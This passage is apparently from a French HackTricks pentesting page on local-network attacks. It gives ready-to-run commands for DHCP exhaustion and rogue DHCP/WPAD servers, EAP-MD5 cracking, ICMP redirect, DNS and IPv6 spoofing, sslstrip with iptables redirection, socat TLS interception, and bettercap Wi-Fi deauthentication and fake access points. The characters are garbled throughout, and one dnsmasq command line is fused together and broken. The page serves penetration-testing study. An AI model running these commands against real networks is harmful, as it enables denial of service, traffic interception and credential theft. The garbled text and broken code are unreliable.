* Naviguer dans les param√®tres d'affichage du t√©l√©phone pour voir les informations sur le mod√®le.
* Connecter l'appareil VoIP √† un ordinateur portable et observer les requ√™tes CDP √† l'aide de Wireshark.

Une commande exemple pour ex√©cuter l'outil en mode trois serait :
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Attaques DHCP

#### √ânum√©ration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Deux types de DoS** peuvent √™tre effectu√©s contre les serveurs DHCP. Le premier consiste √† **simuler suffisamment de faux h√¥tes pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les r√©ponses du serveur DHCP et compl√©ter le protocole (**Discover** (Comp) --> **Offer** (serveur) --> **Request** (Comp) --> **ACK** (serveur)). Par exemple, cela **n'est pas possible dans les r√©seaux Wifi**.

Une autre fa√ßon d'effectuer un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque adresse IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une mani√®re plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pourriez utiliser les attaques DoS mentionn√©es pour forcer les clients √† obtenir de nouveaux baux dans l'environnement et √©puiser les serveurs l√©gitimes afin qu'ils deviennent non r√©actifs. Ainsi, lorsque les l√©gitimes essaient de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionn√©es dans l'attaque suivante**.

#### D√©finir des valeurs malveillantes

Un serveur DHCP malveillant peut √™tre configur√© en utilisant le script DHCP situ√© √† `/usr/share/responder/DHCP.py`. Cela est utile pour les attaques r√©seau, comme la capture du trafic HTTP et des identifiants, en redirigeant le trafic vers un serveur malveillant. Cependant, la configuration d'une passerelle malveillante est moins efficace car elle ne permet que de capturer le trafic sortant du client, manquant les r√©ponses de la v√©ritable passerelle. Au lieu de cela, il est recommand√© de configurer un serveur DNS ou WPAD malveillant pour une attaque plus efficace.

Voici les options de commande pour configurer le serveur DHCP malveillant :

* **Notre adresse IP (Annonce de passerelle)** : Utilisez `-i 10.0.0.100` pour annoncer l'adresse IP de votre machine comme passerelle.
* **Nom de domaine DNS local** : En option, utilisez `-d example.org` pour d√©finir un nom de domaine DNS local.
* **Adresse IP du routeur/passerelle d'origine** : Utilisez `-r 10.0.0.1` pour sp√©cifier l'adresse IP du routeur ou de la passerelle l√©gitime.
* **Adresse IP du serveur DNS principal** : Utilisez `-p 10.0.0.100` pour d√©finir l'adresse IP du serveur DNS malveillant que vous contr√¥lez.
* **Adresse IP du serveur DNS secondaire** : En option, utilisez `-s 10.0.0.1` pour d√©finir une adresse IP de serveur DNS secondaire.
* **Masque de sous-r√©seau du r√©seau local** : Utilisez `-n 255.255.255.0` pour d√©finir le masque de sous-r√©seau pour le r√©seau local.
* **Interface pour le trafic DHCP** : Utilisez `-I eth1` pour √©couter le trafic DHCP sur une interface r√©seau sp√©cifique.
* **Adresse de configuration WPAD** : Utilisez `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù` pour d√©finir l'adresse de configuration WPAD, aidant √† l'interception du trafic web.
* **Usurper l'adresse IP de la passerelle par d√©faut** : Incluez `-S` pour usurper l'adresse IP de la passerelle par d√©faut.
* **R√©pondre √† toutes les demandes DHCP** : Incluez `-R` pour faire en sorte que le serveur r√©ponde √† toutes les demandes DHCP, mais soyez conscient que cela est bruyant et peut √™tre d√©tect√©.

En utilisant correctement ces options, un serveur DHCP malveillant peut √™tre √©tabli pour intercepter efficacement le trafic r√©seau.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Attaques EAP**

Voici quelques-unes des tactiques d'attaque qui peuvent √™tre utilis√©es contre les impl√©mentations 802.1X :

* Grattage actif de mots de passe par force brute via EAP
* Attaque du serveur RADIUS avec du contenu EAP malform√© _\*\*_(exploits)
* Capture de messages EAP et cracking de mots de passe hors ligne (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic r√©seau malveillant lors de l'authentification en utilisant un hub ou similaire

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il pourrait essayer de d√©grader (si n√©cessaire) le protocole d'authentification √† EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait utiliser la force brute pour cela :
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles r√©seau con√ßus pour **cr√©er un syst√®me de routage redondant √† chaud**. Avec FHRP, des routeurs physiques peuvent √™tre combin√©s en un seul dispositif logique, ce qui augmente la tol√©rance aux pannes et aide √† r√©partir la charge.

**Les ing√©nieurs de Cisco Systems ont d√©velopp√© deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Trois versions du protocole de routage RIP (Routing Information Protocol) sont connues : RIP, RIPv2 et RIPng. Les datagrammes sont envoy√©s aux pairs via le port 520 en utilisant UDP par RIP et RIPv2, tandis que les datagrammes sont diffus√©s au port UDP 521 via multicast IPv6 par RIPng. Le support de l'authentification MD5 a √©t√© introduit par RIPv2. En revanche, l'authentification native n'est pas incorpor√©e par RIPng ; au lieu de cela, on s'appuie sur des en-t√™tes IPsec AH et ESP optionnels dans IPv6.

* **RIP et RIPv2 :** La communication se fait par des datagrammes UDP sur le port 520.
* **RIPng :** Utilise le port UDP 521 pour diffuser des datagrammes via multicast IPv6.

Notez que RIPv2 prend en charge l'authentification MD5 tandis que RIPng n'inclut pas d'authentification native, s'appuyant sur des en-t√™tes IPsec AH et ESP dans IPv6.

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole √† vecteur de distance.** S'il n'y a **pas d'authentification** et de configuration des interfaces passives, un **intrus** peut interf√©rer avec le routage EIGRP et provoquer un **empoisonnement des tables de routage**. De plus, le r√©seau EIGRP (en d'autres termes, le syst√®me autonome) **est plat et n'a pas de segmentation en zones**. Si un **attaquant injecte une route**, il est probable que cette route **se propage** dans tout le syst√®me EIGRP autonome.

Attaquer un syst√®me EIGRP n√©cessite **d'√©tablir un voisinage avec un routeur EIGRP l√©gitime**, ce qui ouvre de nombreuses possibilit√©s, de la reconnaissance de base √† diverses injections.

[**FRRouting**](https://frrouting.org/) vous permet de mettre en ≈ìuvre **un routeur virtuel qui prend en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Tout ce que vous avez √† faire est de le d√©ployer sur le syst√®me de votre attaquant et vous pouvez en fait pr√©tendre √™tre un routeur l√©gitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) a des capacit√©s pour intercepter les diffusions EIGRP (Enhanced Interior Gateway Routing Protocol). Il permet √©galement l'injection de paquets, qui peuvent √™tre utilis√©s pour modifier les configurations de routage.

### OSPF

Dans le protocole Open Shortest Path First (OSPF), **l'authentification MD5 est couramment utilis√©e pour garantir une communication s√©curis√©e entre les routeurs**. Cependant, cette mesure de s√©curit√© peut √™tre compromise √† l'aide d'outils comme Loki et John the Ripper. Ces outils sont capables de capturer et de casser des hachages MD5, exposant la cl√© d'authentification. Une fois cette cl√© obtenue, elle peut √™tre utilis√©e pour introduire de nouvelles informations de routage. Pour configurer les param√®tres de route et √©tablir la cl√© compromise, les onglets _Injection_ et _Connection_ sont utilis√©s, respectivement.

* **Capturer et casser des hachages MD5 :** Des outils tels que Loki et John the Ripper sont utilis√©s √† cet effet.
* **Configurer les param√®tres de route :** Cela se fait via l'onglet _Injection_.
* **D√©finir la cl√© compromise :** La cl√© est configur√©e sous l'onglet _Connection_.

### Autres outils et sources g√©n√©riques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour scanner le trafic r√©seau et trouver des vuln√©rabilit√©s
* Vous pouvez trouver **plus d'informations sur les attaques r√©seau** [**ici**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaquant configure tous les param√®tres r√©seau (GW, IP, DNS) du nouveau membre du r√©seau en envoyant de fausses r√©ponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

V√©rifiez la [section pr√©c√©dente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste √† envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une IP. Ensuite, lorsque la victime souhaite contacter l'IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant r√©soudra certains (ou tous) les domaines que la victime demande.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles Locales

Il existe souvent plusieurs routes vers des syst√®mes et des r√©seaux. Apr√®s avoir √©tabli une liste d'adresses MAC au sein du r√©seau local, utilisez _gateway-finder.py_ pour identifier les h√¥tes qui prennent en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pour la r√©solution locale des h√¥tes lorsque les recherches DNS √©chouent, les syst√®mes Microsoft s'appuient sur **Link-Local Multicast Name Resolution (LLMNR)** et le **NetBIOS Name Service (NBT-NS)**. De m√™me, **Apple Bonjour** et les impl√©mentations **Linux zero-configuration** utilisent **Multicast DNS (mDNS)** pour d√©couvrir des syst√®mes au sein d'un r√©seau. En raison de la nature non authentifi√©e de ces protocoles et de leur fonctionnement sur UDP, diffusant des messages, ils peuvent √™tre exploit√©s par des attaquants cherchant √† rediriger les utilisateurs vers des services malveillants.

Vous pouvez usurper des services recherch√©s par des h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment usurper des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les navigateurs utilisent couramment le **protocole Web Proxy Auto-Discovery (WPAD) pour acqu√©rir automatiquement les param√®tres de proxy**. Cela implique de r√©cup√©rer des d√©tails de configuration √† partir d'un serveur, sp√©cifiquement via une URL telle que "http://wpad.example.org/wpad.dat". La d√©couverte de ce serveur par les clients peut se faire par divers m√©canismes :

* Par **DHCP**, o√π la d√©couverte est facilit√©e par l'utilisation d'une entr√©e de code sp√©cial 252.
* Par **DNS**, ce qui implique de rechercher un nom d'h√¥te √©tiquet√© _wpad_ dans le domaine local.
* Via **Microsoft LLMNR et NBT-NS**, qui sont des m√©canismes de secours utilis√©s lorsque les recherches DNS √©chouent.

L'outil Responder tire parti de ce protocole en agissant comme un **serveur WPAD malveillant**. Il utilise DHCP, DNS, LLMNR et NBT-NS pour induire les clients en erreur afin qu'ils se connectent √† lui. Pour approfondir comment les services peuvent √™tre usurp√©s en utilisant Responder [v√©rifiez ceci](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP et appareils UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez offrir diff√©rents services dans le r√©seau pour essayer de **tromper un utilisateur** afin qu'il entre des **identifiants en texte clair**. **Plus d'informations sur cette attaque dans** [**Spoofing SSDP et appareils UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Cette attaque est tr√®s similaire √† l'ARP Spoofing mais dans le monde IPv6. Vous pouvez amener la victime √† penser que l'IPv6 du GW a le MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Certains syst√®mes d'exploitation configurent par d√©faut la passerelle √† partir des paquets RA envoy√©s dans le r√©seau. Pour d√©clarer l'attaquant comme routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Par d√©faut, certains syst√®mes d'exploitation essaient de configurer le DNS en lisant un paquet DHCPv6 dans le r√©seau. Ensuite, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer lui-m√™me en tant que DNS. Le DHCP fournit √©galement une IPv6 √† la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (page factice et injection de code JS)

## Attaques Internet

### sslStrip

Fondamentalement, ce que cette attaque fait, c'est que, dans le cas o√π l'**utilisateur** essaie d'**acc√©der** √† une page **HTTP** qui est **redirig√©e** vers la version **HTTPS**. **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur** afin qu'il puisse **sniffer** la connexion en **texte clair**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **diff√©rence** entre **sslStrip+ et dns2proxy** par rapport √† **sslStrip** est qu'ils **redirigeront** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **suppl√©mentaire** "**w**") et d√©finiront l'**adresse de ce domaine comme l'IP de l'attaquant**. De cette mani√®re, le **client** se **connectera** √† _**wwww.facebook.com**_ **(l'attaquant)** mais en arri√®re-plan **sslstrip+** **maintiendra** la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est d'**√©viter HSTS** car _**wwww**.facebook.com_ **ne sera pas** enregistr√© dans le **cache** du navigateur, donc le navigateur sera tromp√© pour effectuer **l'authentification facebook en HTTP**.\
Notez que pour r√©aliser cette attaque, la victime doit d'abord essayer d'acc√©der √† [http://www.faceook.com](http://www.faceook.com) et non https. Cela peut √™tre fait en modifiant les liens √† l'int√©rieur d'une page http.

More info [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionnent plus. Cela est d√ª au fait qu'il y a des r√®gles HSTS pr√©enregistr√©es dans les navigateurs, donc m√™me si c'est la premi√®re fois qu'un utilisateur acc√®de √† un domaine "important", il y acc√©dera via HTTPS. De plus, notez que les r√®gles pr√©enregistr√©es et d'autres r√®gles g√©n√©r√©es peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple de** _**wwww.facebook.com**_ **d'avant ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP √©coute sur le port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL √©coute sur le port

#### G√©n√©rer des cl√©s et un certificat auto-sign√©
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### √âcouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### √âcouter en utilisant un certificat et rediriger vers les h√¥tes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client v√©rifie que le CA est valide, vous pourriez **servir un certificat d'un autre nom d'h√¥te sign√© par un CA**.\
Un autre test int√©ressant est de servir un **certificat du nom d'h√¥te demand√© mais auto-sign√©**.

D'autres choses √† tester sont d'essayer de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou d'utiliser la cl√© publique valide, forcer l'utilisation d'un algorithme comme Diffie-Hellman (un qui n'a pas besoin de d√©chiffrer quoi que ce soit avec la vraie cl√© priv√©e) et lorsque le client demande une preuve de la vraie cl√© priv√©e (comme un hachage), envoyer une fausse preuve et s'attendre √† ce que le client ne v√©rifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de d√©couverte active

Prenez en compte que lorsqu'un paquet UDP est envoy√© √† un appareil qui n'a pas le port demand√©, un ICMP (Port Inaccessible) est envoy√©.

### **D√©couverte ARP**

Les paquets ARP sont utilis√©s pour d√©couvrir quelles adresses IP sont utilis√©es √† l'int√©rieur du r√©seau. Le PC doit envoyer une requ√™te pour chaque adresse IP possible et seules celles qui sont utilis√©es r√©pondront.

### **mDNS (DNS multicast)**

Bettercap envoie une requ√™te MDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet r√©pond g√©n√©ralement √† cette requ√™te. Ensuite, elle recherche uniquement les machines r√©pondant √† "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (Serveur de noms NetBios)**

Bettercap diffuse des paquets sur le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocole de d√©couverte de services simple)**

Bettercap diffuse des paquets SSDP √† la recherche de tous types de services (port UDP 1900).

### **WSD (D√©couverte de services Web)**

Bettercap diffuse des paquets WSD √† la recherche de services (port UDP 3702).

## R√©f√©rences

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **√âvaluation de la s√©curit√© du r√©seau : Conna√Ætre votre r√©seau (3e √©dition)**
* **Practical IoT Hacking : Le guide d√©finitif pour attaquer l'Internet des objets. Par Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une plateforme de **bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
